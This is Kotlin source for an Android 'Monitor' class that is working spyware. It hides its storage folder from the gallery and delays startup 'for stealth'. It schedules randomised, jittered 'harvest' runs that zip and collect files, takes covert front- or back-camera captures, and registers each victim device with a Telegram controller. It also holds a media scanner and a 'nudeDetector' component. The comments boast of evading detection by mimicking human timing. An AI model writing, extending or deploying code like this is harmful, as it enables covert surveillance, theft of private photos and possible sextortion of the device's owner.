package com.example.app

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import kotlin.random.Random

/**
 * فئة المراقبة الرئيسية.
 * ✅ تم إصلاح methodCache ليكون thread-safe باستخدام ConcurrentHashMap.
 * ✅ تم إصلاح invokeMethod لمطابقة عدد المعاملات.
 * ✅ تم إضافة Jitter عشوائي (25%±) في حلقة المراقبة لتجنب الأنماط الثابتة.
 * ✅ تم إضافة تأخير عشوائي عند بدء التشغيل لتجنب البصمة الزمنية.
 * ✅ تم إضافة جيتر منفصل لفترات الحصاد والكاميرا.
 * ✅ تم إضافة حد أقصى للجيتر لمنع التأخيرات الطويلة غير الطبيعية.
 * ✅ تم تطبيق تأخيرات عشوائية في جميع حلقات المراقبة لمحاكاة السلوك البشري.
 * ✅ تم توسيع نطاق تأخير بدء التشغيل إلى 15-60 ثانية.
 * ✅ تم زيادة الحد الأدنى للفاصل الزمني إلى 120 ثانية.
 */
class Monitor private constructor(context: Context) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val harvestMutex = Mutex()

    @Volatile private var isRunning = false
    @Volatile private var isHarvestRunning = false

    var deviceId: String = "DEV_PC"
        private set
    var deviceModel: String = "Android_Device"
        private set

    // ========== المسارات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply { if (!exists()) mkdirs() }
    }
    private val configFile: File by lazy { File(runtimeDir, "c.json") }
    private val lastHarvestFile: File by lazy { File(runtimeDir, "lh") }
    private val waitingTimeFile: File by lazy { File(runtimeDir, "wt") }
    private val logFile: File by lazy { File(runtimeDir, "m.log") }

    // ========== المكونات الخارجية ==========
    var ui: Any? = null
    var dailyZipper: Any? = null
    var cameraAnalyzer: Any? = null
    var mediaScanner: Any? = null
    var ctrl: Long? = null
    var vlt: Long? = null
    var nudeDetector: Any? = null

    // ========== الإعدادات ==========
    private val configMap = mutableMapOf<String, Any>(
        "hth" to 15,
        "wl" to false,
        "iv" to 900L,
        "harvest_min_interval" to 7200L,
        "harvest_random_hours_min" to 2,
        "harvest_random_hours_max" to 6,
        "harvest_jitter_minutes" to 7,
        "harvest_jitter_max_minutes" to 53,
        "auto_camera" to false,
        "camera_interval" to 3600L,
        "camera_jitter" to 600L,
        "max_harvest_files" to 200,
        "force_harvest_on_start" to false,
        "scan_on_start" to true,
        "min_wifi_strength" to -80,
        "enable_auto_harvest" to true,
        "jitter_percent" to 0.25, // ✅ نسبة الجيتر (25%)
        "max_jitter_limit" to 300L // ✅ الحد الأقصى للجيتر بالثواني
    )

    // ✅ استخدام ConcurrentHashMap
    private val methodCache = ConcurrentHashMap<String, Method>()

    companion object {
        private const val TAG = "Monitor"

        @Volatile
        private var instance: Monitor? = null

        fun getInstance(context: Context): Monitor {
            return instance ?: synchronized(this) {
                instance ?: Monitor(context).also { instance = it }
            }
        }

        fun getDeviceTag(context: Context): String {
            return try {
                val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
                if (!androidId.isNullOrEmpty()) androidId.take(8).lowercase(Locale.ROOT)
                else {
                    val model = "${Build.MANUFACTURER} ${Build.MODEL}"
                    val md = MessageDigest.getInstance("MD5")
                    md.digest(model.toByteArray()).take(4).joinToString("") { "%02x".format(it) }
                }
            } catch (_: Exception) { "unknown" }
        }
    }

    init {
        setupEnvironment()
        loadConfig()
        fetchDeviceInfo()
        ensureNextHarvestTime()
    }

    // ============================================================
    //  دوال الإعدادات
    // ============================================================

    private fun setupEnvironment() {
        try {
            if (!runtimeDir.exists()) {
                runtimeDir.mkdirs()
                writeLog("✅ Runtime directory created: ${runtimeDir.absolutePath}")
            }
            // إنشاء ملف .nomedia لإخفاء المجلد عن المعرض
            val nomedia = File(runtimeDir, ".nomedia")
            if (!nomedia.exists()) {
                nomedia.createNewFile()
            }
        } catch (e: Exception) {
            writeLog("Setup environment error: ${e.message}")
        }
    }

    private fun loadConfig() {
        if (!configFile.exists()) {
            saveConfig()
            return
        }
        try {
            val jsonStr = configFile.readText(Charsets.UTF_8)
            val json = JSONObject(jsonStr)
            json.keys().forEach { key ->
                configMap[key] = json.get(key)
            }
            writeLog("✅ Config loaded: ${configMap.size} settings")
        } catch (e: Exception) {
            writeLog("Config load error: ${e.message}")
        }
    }

    private fun saveConfig() {
        try {
            val json = JSONObject(configMap as Map<*, *>)
            configFile.writeText(json.toString(2), Charsets.UTF_8)
        } catch (e: Exception) {
            writeLog("Config save error: ${e.message}")
        }
    }

    fun updateConfig(key: String, value: Any): Boolean {
        return try {
            configMap[key] = value
            saveConfig()
            true
        } catch (e: Exception) {
            writeLog("Update config error: ${e.message}")
            false
        }
    }

    private fun fetchDeviceInfo() {
        val ctx = appContext ?: return
        try {
            deviceId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "DEV_PC"
            if (deviceId == "DEV_PC" || deviceId.isBlank()) {
                val fallbackId = "${Build.MANUFACTURER}_${Build.MODEL}_${System.currentTimeMillis() / 1000}"
                val md = MessageDigest.getInstance("MD5")
                deviceId = md.digest(fallbackId.toByteArray()).take(4).joinToString("") { "%02x".format(it) }
            }
            deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
            writeLog("✅ Device: $deviceModel (ID: ${deviceId.take(8)})")
        } catch (e: Exception) {
            writeLog("Fetch device info error: ${e.message}")
        }
    }

    fun isWifiConnected(): Boolean {
        val ctx = appContext ?: return false
        return try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val network = cm.activeNetwork ?: return false
                val capabilities = cm.getNetworkCapabilities(network) ?: return false
                capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
            } else {
                @Suppress("DEPRECATION")
                val wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
                wifiInfo?.isConnected == true
            }
        } catch (e: Exception) {
            writeLog("WiFi check error: ${e.message}")
            false
        }
    }

    fun getBatteryStatus(): Pair<Int, Boolean> {
        val ctx = appContext ?: return Pair(50, false)
        return try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager ?: return Pair(50, false)
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val status = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)
            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
            Pair(level, isCharging)
        } catch (e: Exception) {
            writeLog("Battery status error: ${e.message}")
            Pair(50, false)
        }
    }

    // ============================================================
    //  إدارة وقت الحصاد
    // ============================================================

    private fun parseIsoDateTime(isoStr: String?): Date? {
        if (isoStr.isNullOrBlank()) return null
        return try {
            SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).parse(isoStr)
        } catch (e: Exception) {
            null
        }
    }

    private fun formatIsoDateTime(date: Date): String {
        return SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(date)
    }

    private fun setNextHarvestTime(hoursOverride: Int? = null): Date? {
        val calendar = Calendar.getInstance()
        val minHours = (configMap["harvest_random_hours_min"] as? Number)?.toInt() ?: 2
        val maxHours = (configMap["harvest_random_hours_max"] as? Number)?.toInt() ?: 6

        val hours = hoursOverride ?: Random.nextInt(minHours, maxHours + 1)
        val minutes = Random.nextInt(
            (configMap["harvest_jitter_minutes"] as? Number)?.toInt() ?: 7,
            (configMap["harvest_jitter_max_minutes"] as? Number)?.toInt() ?: 53
        )

        calendar.add(Calendar.HOUR_OF_DAY, hours)
        calendar.add(Calendar.MINUTE, minutes)

        // إضافة عشوائية بالثواني (0-59) لجعل الوقت أكثر طبيعية
        calendar.add(Calendar.SECOND, Random.nextInt(0, 60))

        val nextTime = calendar.time
        try {
            waitingTimeFile.writeText(formatIsoDateTime(nextTime), Charsets.UTF_8)
            writeLog("⏰ Next harvest scheduled: ${formatIsoDateTime(nextTime)}")
        } catch (e: Exception) {
            writeLog("Set next harvest time error: ${e.message}")
        }
        return nextTime
    }

    private fun ensureNextHarvestTime(): Boolean {
        if (!waitingTimeFile.exists()) {
            setNextHarvestTime()
            return true
        }
        try {
            val content = waitingTimeFile.readText(Charsets.UTF_8).trim()
            if (content.isBlank()) {
                setNextHarvestTime()
                return true
            }
            val nextDate = parseIsoDateTime(content)
            if (nextDate == null || nextDate.before(Date())) {
                setNextHarvestTime()
                return true
            }
            return true
        } catch (e: Exception) {
            writeLog("Ensure next harvest error: ${e.message}")
            setNextHarvestTime()
            return true
        }
    }

    private fun updateLastHarvestTime() {
        try {
            lastHarvestFile.writeText(formatIsoDateTime(Date()), Charsets.UTF_8)
        } catch (e: Exception) {
            writeLog("Update last harvest error: ${e.message}")
        }
    }

    private fun canHarvest(force: Boolean): Pair<Boolean, String> {
        if (force) return Pair(true, "Forced")

        if (!(configMap["enable_auto_harvest"] as? Boolean ?: true)) {
            return Pair(false, "Auto harvest disabled")
        }

        if (!waitingTimeFile.exists()) {
            ensureNextHarvestTime()
            return Pair(false, "No schedule")
        }

        try {
            val content = waitingTimeFile.readText(Charsets.UTF_8).trim()
            if (content.isBlank()) {
                ensureNextHarvestTime()
                return Pair(false, "Empty schedule")
            }

            val nextDate = parseIsoDateTime(content)
            if (nextDate == null) {
                ensureNextHarvestTime()
                return Pair(false, "Invalid schedule")
            }

            val now = Date()
            if (now.after(nextDate)) {
                return Pair(true, "Time reached")
            }

            // ✅ إضافة جيتر عشوائي للتحقق من الوقت (تجنب التنفيذ الدقيق في نفس الثانية)
            val timeDiff = nextDate.time - now.time
            val jitterMs = Random.nextLong(-5000, 5000) // ±5 ثواني جيتر
            val adjustedDiff = timeDiff + jitterMs
            if (adjustedDiff <= 0) {
                return Pair(true, "Time reached (with jitter)")
            }

            return Pair(false, "Waiting ${adjustedDiff / 1000}s")
        } catch (e: Exception) {
            writeLog("Can harvest error: ${e.message}")
            return Pair(false, "Error: ${e.message}")
        }
    }

    fun getNextHarvestTime(): Date? {
        return try {
            if (!waitingTimeFile.exists()) null
            else parseIsoDateTime(waitingTimeFile.readText(Charsets.UTF_8).trim())
        } catch (e: Exception) {
            null
        }
    }

    // ============================================================
    //  منطق الحصاد والكاميرا
    // ============================================================

    private suspend fun harvestLogic(force: Boolean = false) {
        val (canHarvestNow, reason) = canHarvest(force)
        if (!canHarvestNow) {
            if (force) writeLog("⏳ Harvest not ready: $reason")
            return
        }

        if (isHarvestRunning) {
            writeLog("⏳ Harvest already running")
            return
        }

        harvestMutex.withLock {
            if (isHarvestRunning) return
            isHarvestRunning = true
        }

        try {
            writeLog("📦 Starting harvest (${if (force) "forced" else "auto"})...")

            // ✅ تأخير عشوائي قبل بدء الحصاد لتجنب الأنماط الثابتة
            val preHarvestDelay = Random.nextLong(2000, 8000)
            delay(preHarvestDelay)

            // استدعاء DailyZipper
            val zipper = getModuleComponent("dailyZipper")
            if (zipper != null) {
                invokeMethod(zipper, "run")
                writeLog("✅ Harvest triggered successfully")
            } else {
                writeLog("⚠️ DailyZipper not available")
            }

            // تحديث وقت الحصاد الأخير
            updateLastHarvestTime()

            // جدولة وقت الحصاد التالي
            setNextHarvestTime()

        } catch (e: Exception) {
            writeLog("❌ Harvest error: ${e.message}")
        } finally {
            isHarvestRunning = false
        }
    }

    private suspend fun cameraLogic() {
        val autoCamera = configMap["auto_camera"] as? Boolean ?: false
        if (!autoCamera) return

        val camera = getModuleComponent("cameraAnalyzer")
        if (camera == null) {
            writeLog("⚠️ CameraAnalyzer not available")
            return
        }

        // التحقق من البطارية قبل الالتقاط
        val (battery, isCharging) = getBatteryStatus()
        val minBattery = configMap["hth"] as? Int ?: 15
        if (battery < minBattery && !isCharging) {
            writeLog("⏭️ Camera skipped: battery $battery% < $minBattery%")
            return
        }

        try {
            // ✅ تأخير عشوائي قبل الالتقاط لتجنب الأنماط
            val preCaptureDelay = Random.nextLong(1000, 4000)
            delay(preCaptureDelay)
            
            val randomCam = Random.nextInt(2) // 0: خلفية, 1: أمامية
            invokeMethod(camera, "harvest", randomCam)
            writeLog("📸 Auto-capture triggered (camera: ${if (randomCam == 0) "back" else "front"})")
        } catch (e: Exception) {
            writeLog("⚠️ Camera logic error: ${e.message}")
        }
    }

    // ============================================================
    //  ✅ دورة الحياة مع Jitter محسن
    // ============================================================

    fun start() {
        if (isRunning) return
        isRunning = true

        scope.launch {
            // ✅ تأخير عشوائي عند بدء التشغيل (15-60 ثانية) لتجنب البصمة الزمنية
            val startupDelay = Random.nextLong(15_000, 60_000)
            writeLog("⏳ Delaying startup by ${startupDelay / 1000}s for stealth...")
            delay(startupDelay)

            val scanOnStart = configMap["scan_on_start"] as? Boolean ?: true
            if (scanOnStart && mediaScanner != null) {
                try {
                    invokeMethod(mediaScanner, "runScan", true)
                    writeLog("✅ Initial scan completed")
                } catch (e: Exception) {
                    writeLog("Initial scan error: ${e.message}")
                }
            }

            // تسجيل الجهاز في Telegram
            ui?.let { uiObj ->
                try {
                    invokeMethod(uiObj, "registerDevice", deviceId, deviceModel)
                    writeLog("✅ Device registered with Telegram")
                } catch (_: Exception) {
                    try {
                        invokeMethod(uiObj, "_api", "sendMessage", mapOf(
                            "chat_id" to ctrl,
                            "text" to "📱 جهاز جديد متصل\nID: `$deviceId`\nModel: $deviceModel",
                            "parse_mode" to "Markdown"
                        ))
                    } catch (_: Exception) {
                        writeLog("⚠️ Failed to register device")
                    }
                }
            }

            val forceStart = configMap["force_harvest_on_start"] as? Boolean ?: false
            if (forceStart) {
                writeLog("🚀 Starting forced harvest on startup")
                forceHarvest()
            }

            // ✅ الحلقة الرئيسية مع Jitter محسن
            while (isRunning && isActive) {
                try {
                    // تنفيذ منطق الحصاد والكاميرا
                    harvestLogic(force = false)
                    cameraLogic()
                } catch (e: Exception) {
                    writeLog("Monitor loop error: ${e.message}")
                }

                // ✅ حساب الفاصل الزمني مع Jitter عشوائي (±25%)
                val baseInterval = (configMap["iv"] as? Number)?.toLong() ?: 900L // بالثواني
                val jitterPercent = (configMap["jitter_percent"] as? Number)?.toDouble() ?: 0.25
                val maxJitterLimit = (configMap["max_jitter_limit"] as? Number)?.toLong() ?: 300L // بالثواني

                // تطبيق الجيتر العشوائي
                val jitterFactor = 1.0 + Random.nextDouble(-jitterPercent, jitterPercent)
                var jitteredInterval = (baseInterval * jitterFactor).toLong()

                // ✅ الحد الأدنى للفاصل الزمني (لا يقل عن 120 ثانية)
                jitteredInterval = maxOf(120L, jitteredInterval)

                // الحد الأقصى للجيتر (لا يزيد عن baseInterval + maxJitterLimit)
                jitteredInterval = minOf(baseInterval + maxJitterLimit, jitteredInterval)

                // تحويل إلى ملي ثانية
                val finalDelay = jitteredInterval * 1000L

                writeLog("⏱️ Next cycle in ${jitteredInterval}s (base: ${baseInterval}s, jitter: ${String.format("%.1f", (jitterFactor - 1.0) * 100)}%)")
                delay(finalDelay)
            }
        }
    }

    fun stop() {
        isRunning = false
        scope.cancel()
        writeLog("🛑 Monitor stopped")
    }

    fun forceHarvest() {
        scope.launch {
            harvestLogic(force = true)
        }
    }

    fun resetHarvestTimer() {
        setNextHarvestTime()
        writeLog("🔄 Harvest timer reset")
    }

    fun isHarvesting(): Boolean = isHarvestRunning

    fun getStatus(): Map<String, Any?> {
        val nextHarvest = getNextHarvestTime()
        val (battery, isCharging) = getBatteryStatus()
        return mapOf(
            "running" to isRunning,
            "harvesting" to isHarvestRunning,
            "device_id" to deviceId,
            "device_model" to deviceModel,
            "wifi_connected" to isWifiConnected(),
            "battery_level" to battery,
            "battery_charging" to isCharging,
            "next_harvest" to nextHarvest?.let { formatIsoDateTime(it) },
            "last_harvest" to (if (lastHarvestFile.exists()) lastHarvestFile.readText(Charsets.UTF_8).trim() else null),
            "config" to configMap
        )
    }

    // ============================================================
    //  دوال مساعدة للانعكاس
    // ============================================================

    private fun getModuleComponent(fieldName: String): Any? {
        return try {
            val field = this.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(this)
        } catch (e: Exception) {
            writeLog("Get component error ($fieldName): ${e.message}")
            null
        }
    }

    private fun writeLog(message: String) {
        Log.i(TAG, message)
        try {
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("[$timestamp] [INFO] $message\n", Charsets.UTF_8)
        } catch (_: Exception) {}
    }

    /**
     * ✅ استدعاء دالة عبر الانعكاس مع تخزين مؤقت ومطابقة عدد المعاملات.
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"

        var method = methodCache[key]
        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                writeLog("Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
